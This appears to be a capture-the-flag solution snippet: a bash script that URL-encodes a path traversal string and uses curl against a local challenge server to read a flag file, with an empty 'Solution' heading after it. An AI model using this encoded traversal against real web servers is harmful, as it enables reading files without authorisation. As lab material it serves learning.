# Code
path_to_encode="fortunes/../../../flag"
url_encoded_path=$(echo -n "$path_to_encode" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
curl -v "http://challenge.localhost:80/content/$url_encoded_path"


# Solution
